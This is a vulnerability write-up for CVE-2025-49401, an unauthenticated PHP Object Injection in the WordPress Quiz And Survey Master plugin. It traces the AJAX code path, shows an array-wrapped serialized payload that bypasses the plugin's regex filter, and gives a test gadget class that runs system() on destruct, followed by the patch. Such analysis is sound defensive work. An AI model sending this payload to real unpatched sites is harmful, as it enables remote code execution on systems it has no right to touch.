---
title: CVE-2025-49401 Analysis & POC
description: Security Vulnerability in WordPress Quiz And Survey Master Plugin.
date: 2025-11-17 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, php object injection]
images: ["app.gif"]
featuredImage: "app.gif"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

This plugin performs **unserialize** on user-supplied data through a form field, which may allow **unauthenticated users** to perform **PHP Object Injection** if a suitable gadget exists in the system.

* **CVE ID**: [CVE-2025-49401](https://www.cve.org/CVERecord?id=CVE-2025-49401)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 10.2.5
* **Patched Versions**: 10.2.6
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Quiz And Survey Master Plugin](https://wordpress.org/plugins/quiz-master-next/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** – **Quiz And Survey Master**:

  * `10.2.5` – **vulnerable**
  * `10.2.6` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Cause

The vulnerability originates from the use of `maybe_unserialize()`. Although some checks exist, this mechanism is still not fully secure.

```php {data-open=true title="template-variables.php" hl_lines=[1]}
if ( preg_match( '/^(O|C):\d+:/', $qmn_sanitize_random_ids ) ) {
    return '';
}
if ( is_serialized( $qmn_sanitize_random_ids ) ) {
    $unserialized = maybe_unserialize( $qmn_sanitize_random_ids );
    if ( ! is_object( $unserialized ) && ! is_resource( $unserialized ) ) {
        return $unserialized;
    }
}
```

The patch replaces `maybe_unserialize()` with `unserialize()` and blocks all object creation using `['allowed_classes' => false]` → effectively preventing PHP Object Injection.

![Diff](diff.png "Patch changes")

## Analysis

After reviewing the logic of `qsm_questions_answers_shortcode_to_text()`, I noticed repeated appearances of keywords like `question` and `answer`, indicating this function is likely directly tied to question/answer processing.

Instead of tracing step-by-step, I decided to search for related functions dealing with `question` and `answer`, while debugging inside `qsm_questions_answers_shortcode_to_text()`. If this method didn’t work, I would perform a deeper trace.

After some digging, I created a post with a custom question.

![Quiz Created](create_quiz.png "Creating quiz with the plugin block")

Access the post and **submit an answer**.

![Debug](debug1.png "Debugger at qsm_questions_answers_shortcode_to_text")

The debugger stopped at `qsm_questions_answers_shortcode_to_text()`.

Current request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
...
```

The function `qmn_sanitize_random_ids_data()` will call `maybe_unserialize()`. But first, this condition must be met:

```php
if ( ! empty( $_POST['quiz_answer_random_ids'] ) )
```

We can edit one of the fields in the request and replace it with `quiz_answer_random_ids`.

```diff
- Content-Disposition: form-data; name="currentuserTimeZone"
- Asia/Bangkok
+ Content-Disposition: form-data; name="quiz_answer_random_ids"
+ payload
```

The value of `qmn_sanitize_random_ids` will be the input passed to `maybe_unserialize()`.

![Debug](Value of qmn_sanitize_random_ids)

```php {data-open=true title="template-variables.php" hl_lines=[3,8]} 
function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) {
	if ( is_string( $qmn_sanitize_random_ids ) ) {
		if ( preg_match( '/^(O|C):\d+:/', $qmn_sanitize_random_ids ) ) {
			return '';
		}

		if ( is_serialized( $qmn_sanitize_random_ids ) ) {
			$unserialized = maybe_unserialize( $qmn_sanitize_random_ids );
			if ( ! is_object( $unserialized ) && ! is_resource( $unserialized ) ) {
				return $unserialized;
			}
		}
	}

	return $qmn_sanitize_random_ids;
}
```

Before `maybe_unserialize` is invoked, we need to bypass the only filter:

```php
if ( preg_match( '/^(O|C):\d+:/', $qmn_sanitize_random_ids ) ) {
    return '';
}
```

The regex checks whether the string begins with `O:` or `C:`. For example: `O:8:"stdClass":...`

Unfortunately, the defense is weak. Serialized payloads can begin with `a:` (array), and arrays may contain `O:` or `C:` to trigger object deserialization.

---

The plugin registers an AJAX endpoint for **unauthenticated users** (nopriv):

```php {title="class-qmn-quiz-manager.php"}
add_action( 'wp_ajax_nopriv_qmn_process_quiz', array( $this, 'ajax_submit_results' ) );
```

When a request hits `/wp-admin/admin-ajax.php` with `action=qmn_process_quiz`, the callback `ajax_submit_results()` is executed.

It then calls `submit_results()`, JSON-encodes the output, and echoes it.

```php {title="class-qmn-quiz-manager.php"}
echo wp_json_encode( $this->submit_results( $options, $data ) );
```

`submit_results()` calls `display_results_text()`.

```php {title="class-qmn-quiz-manager.php"}
$results_pages   = $this->display_results_text( $qmn_quiz_options, $qmn_array_for_variables );
```

`display_results_text()` calls `generate_pages()`.

```php {title="class-qsm-results-pages.php"}
return QSM_Results_Pages::generate_pages( $response_data );
```

`generate_pages()` applies the filter previously registered: `mlw_qmn_template_variable_results_page`.

```php {title="class-qsm-results-pages.php"}
echo apply_filters( 'mlw_qmn_template_variable_results_page', $page, $response_data );
```

![Callback](callback.png "Many callbacks registered")

Many callbacks are registered for this filter, but the relevant one here is `mlw_qmn_variable_question_answers`, which directly triggers the function `qsm_questions_answers_shortcode_to_text()` analyzed earlier.

## Flow

{{< mermaid >}}
graph TD
A["POST /wp-admin/admin-ajax.php"] -- action=qmn_process_quiz&other_post_data --> B["wp_ajax_nopriv_qmn_process_quiz"]
B --> C["ajax_submit_results()"]
C --> D["submit_results()"]
D --> E["display_results_text()"]
E --> F["generate_pages()"]
F -- apply filter mlw_qmn_template_variable_results_page --> G["mlw_qmn_variable_question_answers()"]
G --> H["qsm_questions_answers_shortcode_to_text()"]
H --> K{" ! empty( $_POST['quiz_answer_random_ids'] )"}
K -- true --> L["qmn_sanitize_random_ids_data()"] --> M{"preg_match( '/^(O|C):\d+:/', $qmn_sanitize_random_ids )"}
M -- true --> N["return ''"]
M -- false --> V["maybe_unserialize"] --> W["RCE"]
{{< /mermaid >}}

## Proof of Concept (PoC)

1. Use the plugin to create a post with a quiz using the QSM block.
2. Submit the form and intercept the request via Burp.
3. Modify the value of `quiz_answer_random_ids` to contain the serialized payload:

```
a:1:{i:0;O:15:"ObjectInjection":1:{s:7:"command";s:4:"ls /";}}
```

4. Resend the request.

> [!TIP]
> To test locally, create a class with a magic method `__wakeup()` or `__destruct()` in `wp-config.php`:
>
> ```php
> class ObjectInjection
> {
>   public $command;
>   function __destruct(){
>     die(system($this->command));
>   }
> }
> ```

# Conclusion

The **CVE-2025-49401** vulnerability is caused by unsafe input handling through `maybe_unserialize()`, allowing unauthenticated attackers to provide serialized payloads to trigger PHP Object Injection. The filtering based on `preg_match` only blocks payloads beginning with `O:` or `C:` but fails against serialized arrays containing objects. Combined with an open AJAX endpoint (`wp_ajax_nopriv_qmn_process_quiz`), the payload moves through several layers before being unserialized, ultimately enabling arbitrary code execution (RCE) if a suitable gadget chain exists.
The patch uses `unserialize(..., ['allowed_classes' => false])`, completely eliminating object creation and fully mitigating the vulnerability.

# Key Takeaways

* **maybe_unserialize() is inherently dangerous** when handling user input in WordPress.
* **Manual regex filtering is insufficient** to stop deserialization attacks — attackers can wrap malicious objects inside arrays.
* **Unauthenticated AJAX endpoints** are highly sensitive attack surfaces.
* **allowed_classes = false** is the safest mitigation when object deserialization is not needed.
* The more complex the plugin, the **higher the chance of gadget chains leading to RCE**.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Quiz And Survey Master Plugin <= 10.2.5 is vulnerable to a high priority PHP Object Injection](https://patchstack.com/database/wordpress/plugin/quiz-master-next/vulnerability/wordpress-quiz-and-survey-master-plugin-10-2-5-php-object-injection-vulnerability)
